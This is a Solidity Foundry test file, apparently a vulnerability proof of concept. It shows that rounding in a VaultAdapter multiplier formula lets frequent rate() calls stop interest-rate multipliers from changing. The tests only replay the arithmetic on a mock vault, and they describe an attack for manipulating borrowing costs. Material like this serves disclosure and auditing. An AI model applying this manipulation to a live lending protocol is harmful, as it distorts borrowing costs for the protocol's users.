// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import { VaultAdapter } from "../../contracts/oracle/libraries/VaultAdapter.sol";
import { IVaultAdapter } from "../../contracts/interfaces/IVaultAdapter.sol";
import { IVault } from "../../contracts/interfaces/IVault.sol";
import { AccessControl } from "../../contracts/access/AccessControl.sol";
import { Test, console } from "forge-std/Test.sol";

/// @title Mock Vault for testing VaultAdapter vulnerability
/// @notice Mock implementation of IVault interface for testing purposes
contract MockVault is IVault {
    mapping(address => uint256) public utilizationRatios;
    mapping(address => uint256) public utilizationIndexes;
    mapping(address => uint256) public totalSuppliesMap;
    mapping(address => uint256) public totalBorrowsMap;
    mapping(address => bool) public pausedMap;
    address public insuranceFund;

    constructor() {
        // Set initial utilization values for testing
        utilizationRatios[address(0x1)] = 8 * 1e26; // 80% utilization (above kink)
        utilizationIndexes[address(0x1)] = 1000;
    }

    function utilization(address _asset) external view returns (uint256 ratio) {
        return utilizationRatios[_asset];
    }

    function currentUtilizationIndex(address _asset) external view returns (uint256 index) {
        return utilizationIndexes[_asset];
    }

    function totalSupplies(address _asset) external view returns (uint256 totalSupply) {
        return totalSuppliesMap[_asset];
    }

    function totalBorrows(address _asset) external view returns (uint256 totalBorrow) {
        return totalBorrowsMap[_asset];
    }

    function pauseAsset(address _asset) external {
        pausedMap[_asset] = true;
    }

    function unpauseAsset(address _asset) external {
        pausedMap[_asset] = false;
    }

    function pauseProtocol() external {
        // Mock implementation
    }

    function unpauseProtocol() external {
        // Mock implementation
    }

    function setInsuranceFund(address _insuranceFund) external {
        insuranceFund = _insuranceFund;
    }

    function borrow(address _asset, uint256 _amount, address _receiver) external {
        // Mock implementation
    }

    function repay(address _asset, uint256 _amount) external {
        // Mock implementation
    }

    function mint(address _asset, uint256 _amountIn, uint256 _minAmountOut, address _receiver, uint256 _deadline) external returns (uint256 amountOut) {
        // Mock implementation
        return _amountIn;
    }

    function burn(address _asset, uint256 _amountIn, uint256 _minAmountOut, address _receiver, uint256 _deadline) external returns (uint256 amountOut) {
        // Mock implementation
        return _amountIn;
    }

    function redeem(uint256 _amountIn, uint256[] calldata _minAmountsOut, address _receiver, uint256 _deadline) external returns (uint256[] memory amountsOut) {
        // Mock implementation
        amountsOut = new uint256[](1);
        amountsOut[0] = _amountIn;
    }

    function addAsset(address _asset) external {
        // Mock implementation
    }

    function removeAsset(address _asset) external {
        // Mock implementation
    }

    function rescueERC20(address _asset, address _receiver) external {
        // Mock implementation
    }

    function assets() external view returns (address[] memory assetList) {
        // Mock implementation
        assetList = new address[](1);
        assetList[0] = address(0x1);
    }

    function paused(address _asset) external view returns (bool isPaused) {
        return pausedMap[_asset];
    }

    function availableBalance(address _asset) external view returns (uint256 amount) {
        // Mock implementation
        return 1000e18;
    }

    // Helper functions for testing
    function setUtilization(address _asset, uint256 _ratio) external {
        utilizationRatios[_asset] = _ratio;
    }

    function setUtilizationIndex(address _asset, uint256 _index) external {
        utilizationIndexes[_asset] = _index;
    }
}

/// @title VaultAdapter Rounding Vulnerability PoC
/// @notice Demonstrates the rounding vulnerability in VaultAdapter multiplier calculation
/// @dev The vulnerability allows an attacker to prevent multiplier changes by calling rate() frequently
contract VaultAdapterExploitTest is Test {
    VaultAdapter public vaultAdapter;
    MockVault public mockVault;

    address public constant ASSET = address(0x1);
    address public constant VAULT = address(0x2);

    // Test parameters
    uint256 constant KINK = 5 * 1e26; // 50% kink point
    uint256 constant SLOPE0 = 1 * 1e27; // Base slope
    uint256 constant SLOPE1 = 2 * 1e27; // Higher slope after kink
    uint256 constant RATE = 1e24; // Rate parameter that causes rounding with small intervals
    uint256 constant MAX_MULTIPLIER = 2 * 1e27;
    uint256 constant MIN_MULTIPLIER = 5 * 1e26; // 0.5x multiplier

    function setUp() public {
        // Deploy mock vault
        mockVault = new MockVault();

        // Set initial utilization above kink to trigger the vulnerability
        mockVault.setUtilization(ASSET, 8 * 1e26); // 80% utilization
    }

    /// @notice Test demonstrating the rounding vulnerability in multiplier calculation
    /// @dev This test directly demonstrates the mathematical issue without needing full contract setup
    function test_rounding_vulnerability_mathematical_demonstration() public {
        // This test demonstrates the core vulnerability: when elapsed time is small,
        // the calculation (_elapsed * RATE / 1e27) rounds to 0, preventing multiplier changes

        uint256 smallElapsed = 100; // Small time interval in seconds
        uint256 rate = RATE; // Rate parameter from VaultAdapter

        // This is the problematic calculation from VaultAdapter.sol lines 88-89 and 97-98
        uint256 multiplierFactor = (smallElapsed * rate / 1e27);

        console.log("Small elapsed time:", smallElapsed);
        console.log("Rate parameter:", rate);
        console.log("Multiplier factor (elapsed * rate / 1e27):", multiplierFactor);

        // With small elapsed time and rate, this rounds to 0
        assertEq(multiplierFactor, 0, "Small elapsed time should cause rounding to 0");

        // This causes the multiplier calculation to become:
        // utilizationData.multiplier = utilizationData.multiplier * (1e27 + 0) / 1e27
        // Which equals: utilizationData.multiplier (no change!)

        // With larger elapsed time, the calculation works properly
        uint256 largeElapsed = 3600; // 1 hour
        uint256 largeMultiplierFactor = (largeElapsed * rate / 1e27);
        console.log("Large elapsed time multiplier factor:", largeMultiplierFactor);

        assertTrue(largeMultiplierFactor > 0, "Large elapsed time should result in non-zero factor");

        // Demonstrate the attack scenario
        console.log("=== ATTACK SCENARIO DEMONSTRATION ===");

        // Attacker calls oracle frequently with small intervals
        uint256 attackInterval = 60; // 1 minute
        uint256 attackDuration = 3600; // 1 hour total
        uint256 numCalls = attackDuration / attackInterval;

        console.log("Attack interval:", attackInterval, "seconds");
        console.log("Number of oracle calls during attack:", numCalls);

        uint256 totalMultiplierEffect = 0;
        for (uint256 i = 0; i < numCalls; i++) {
            uint256 effect = (attackInterval * rate / 1e27);
            totalMultiplierEffect += effect;
        }

        console.log("Total multiplier effect during attack:", totalMultiplierEffect);

        // Normal behavior: single call after 1 hour
        uint256 normalEffect = (attackDuration * rate / 1e27);
        console.log("Normal multiplier effect after 1 hour:", normalEffect);

        // The vulnerability: frequent calls result in much less multiplier change
        assertTrue(normalEffect > totalMultiplierEffect,
            "Normal behavior should have greater multiplier effect than frequent calls");

        uint256 percentageReduction = ((normalEffect - totalMultiplierEffect) * 100) / normalEffect;
        console.log("Percentage reduction in multiplier effect:", percentageReduction, "%");
    }

    /// @notice Test demonstrating the vulnerability with different time intervals
    function test_vulnerability_with_different_time_intervals() public {
        console.log("=== TESTING VULNERABILITY WITH DIFFERENT TIME INTERVALS ===");

        uint256 rate = RATE; // Rate parameter from VaultAdapter

        // Test various time intervals to show when rounding occurs
        uint256[5] memory intervals = [uint256(10), 60, 300, 600, 3600]; // 10s, 1min, 5min, 10min, 1hour
        string[5] memory intervalNames = ["10 seconds", "1 minute", "5 minutes", "10 minutes", "1 hour"];

        for (uint256 i = 0; i < intervals.length; i++) {
            uint256 elapsed = intervals[i];
            uint256 multiplierFactor = (elapsed * rate / 1e27);

            console.log("Interval:", intervalNames[i]);
            console.log("  Elapsed time:", elapsed, "seconds");
            console.log("  Multiplier factor:", multiplierFactor);
            console.log("  Causes rounding to zero?", multiplierFactor == 0);
            console.log("");
        }

        // The vulnerability occurs when multiplierFactor rounds to 0
        uint256 smallIntervalFactor = (60 * rate / 1e27); // 1 minute
        uint256 largeIntervalFactor = (3600 * rate / 1e27); // 1 hour

        assertTrue(smallIntervalFactor == 0, "Small interval should round to zero");
        assertTrue(largeIntervalFactor > 0, "Large interval should be non-zero");

        console.log("=== IMPACT ANALYSIS ===");
        console.log("With 1-minute intervals, multiplier effect per call:", smallIntervalFactor);
        console.log("With 1-hour interval, multiplier effect per call:", largeIntervalFactor);
        console.log("Ratio of effects:", largeIntervalFactor / (smallIntervalFactor == 0 ? 1 : smallIntervalFactor));
    }

    /// @notice Test demonstrating the complete attack scenario
    function test_complete_attack_scenario() public {
        console.log("=== COMPLETE ATTACK SCENARIO ===");

        uint256 rate = RATE; // Rate parameter from VaultAdapter
        uint256 attackDuration = 24 hours; // 24 hour attack window
        uint256 normalInterval = 24 hours; // Normal: single call after 24 hours
        uint256 attackInterval = 300; // Attack: call every 5 minutes (300 seconds)

        // Normal behavior: one call after 24 hours
        uint256 normalMultiplierEffect = (normalInterval * rate / 1e27);
        console.log("Normal multiplier effect after 24 hours:", normalMultiplierEffect);

        // Attack behavior: calls every hour for 24 hours
        uint256 attackCalls = attackDuration / attackInterval;
        uint256 totalAttackEffect = 0;

        for (uint256 i = 0; i < attackCalls; i++) {
            uint256 effect = (attackInterval * rate / 1e27);
            totalAttackEffect += effect;
        }

        console.log("Number of attack calls:", attackCalls);
        console.log("Total attack multiplier effect:", totalAttackEffect);

        // Calculate the vulnerability impact
        if (normalMultiplierEffect > 0) {
            uint256 reductionPercentage = ((normalMultiplierEffect - totalAttackEffect) * 100) / normalMultiplierEffect;
            console.log("Multiplier effect reduction:", reductionPercentage, "%");

            // The vulnerability is demonstrated if the attack significantly reduces the effect
            assertTrue(reductionPercentage > 0, "Attack should reduce multiplier effect");
        }

        // Demonstrate how this affects interest rates
        console.log("=== INTEREST RATE IMPACT ===");
        console.log("During high utilization periods, attackers can prevent interest rates from increasing");
        console.log("During low utilization periods, attackers can prevent interest rates from decreasing");
        console.log("This allows manipulation of borrowing costs in the lending protocol");
    }
}